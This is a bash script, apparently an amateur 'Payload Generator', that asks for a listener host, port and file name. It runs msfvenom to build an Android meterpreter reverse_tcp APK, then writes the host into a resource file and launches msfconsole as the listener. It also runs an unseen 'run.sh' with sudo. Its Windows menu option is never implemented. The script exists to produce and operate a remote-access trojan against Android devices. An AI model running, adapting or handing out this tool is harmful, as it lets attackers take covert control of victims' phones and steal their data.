#!/usr/bin/env bash
clear
sudo apt-get install pv -y
clear
pkg install pv -y
clear

echo ""
echo ""
		echo -e "\e[5m \e[1m\e[40;38;5;82m->->->_OGGY_<-<-<-<\e[25m\e[0m" | pv -qL 4
  echo ""

  echo "
██████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║░╚████╔╝░██║░░░░░██║░░██║███████║██║░░██║
██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║██║░░██║
██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░

░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝"

read -p $'\e[1;32m\e[0m\e[1;32m apk:>>> Android  \n \e[34mexe:>>> Windows \e[0m \n\e[0m\e[1;33m 4:>>> EXIT \e[0m \n MODE:->:' option
echo""
echo""
echo""

if [[ $option == *'apk'* ]]; then
clear

	echo "PAYLOAD tool are getting ready " | pv -qL 8
	sleep 3
	clear
	echo " "

  echo -e "\e[92mAndroid " | pv -qL 6 && echo -e "\e[92mPAYLOAD GENERATING TOOL IS READY "

	echo " "
	printf " \e[34m Enter Lport for payload  \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 6

	read port
	echo " "

	printf " \e[34m Enter Lhost for payload \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 6

	read lhost
	echo " "

	printf " \e[34m Enter Lhost for Listner \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 6

	read lhost1
	echo " "

	printf " \e[34m ENter a name for the Payload  \e[0m \e[40;38;5;82m====> : \e[0m " | pv -qL 6

	read name
	echo " "

	printf " \e[101m\e[1;73m_WAIT_PAYLOAD_IS_GENERATING\e[0m"
	echo " "
	msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk && clear
	clear
  	echo ""
	echo -e $'\033[96m PAYLOAD IS BEING GENERATED====> \e[1;33m '$name.apk' ' | pv -qL 6
	sleep 3
	echo ""
	echo ""

	echo -e $'\033[96m WAIT  LISTENER TO START\e[0m\n'

echo -ne '##           (5%)\r'
sleep 1
echo -ne '#######         (25%)\r'
sleep 1
echo -ne '#########           (50%)\r'
sleep 1
echo -ne '###########               (65%)\r'
sleep 1
echo -ne '################             (85%)\r'
sleep 1
echo -ne '#########################      (100%)\r'
echo -ne '\n'

echo -ne '\n'

	clear
	sleep 2 && clear
  sed -e "s/\$lhost/$lhost1/" and-meterpreter.rc > $name.rc
	msfconsole -r $name.rc
	clear
  sleep 2
  sudo bash run.sh

  clear

fi

clear
echo "EXITING THE TOOL"
exit
clear

sleep 3
./payload.sh
---------end---------of-----------------android-----------------------#
